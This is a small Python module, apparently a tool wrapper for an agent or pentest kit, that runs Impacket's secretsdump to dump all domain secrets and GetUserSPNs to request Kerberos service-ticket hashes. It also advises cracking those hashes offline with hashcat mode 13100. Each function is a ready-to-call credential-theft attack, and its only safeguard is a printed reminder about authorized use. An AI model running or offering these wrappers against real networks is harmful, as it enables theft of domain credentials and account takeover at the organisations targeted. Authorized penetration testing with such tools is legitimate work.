import subprocess


def _run(argv):
    try:
        r = subprocess.run(argv, capture_output=True, text=True, timeout=300)
    except FileNotFoundError:
        return "Error: impacket scripts not installed"
    except subprocess.TimeoutExpired:
        return "Error: timed out after 300s"
    return f"exit={r.returncode}\n" + ((r.stdout or "") + (r.stderr or ""))[:12000]


def secrets_dump(target: str = "", dc: str = "") -> str:
    if not target:
        return "Error: target required (domain/user:pass@host)"
    argv = ["impacket-secretsdump", target.strip()]
    if dc:
        argv += ["-dc-ip", dc.strip()]
    return _run(argv) + "\nOnly with VALID AUTHORIZED credentials — this dumps all domain secrets."


def get_userspns(target: str = "", dc: str = "") -> str:
    if not target:
        return "Error: target required (domain/user:pass@host)"
    argv = ["impacket-GetUserSPNs", "-request", target.strip()]
    if dc:
        argv += ["-dc-ip", dc.strip()]
    return _run(argv) + "\nCaptured SPN hashes crack offline via hashcat -m 13100."
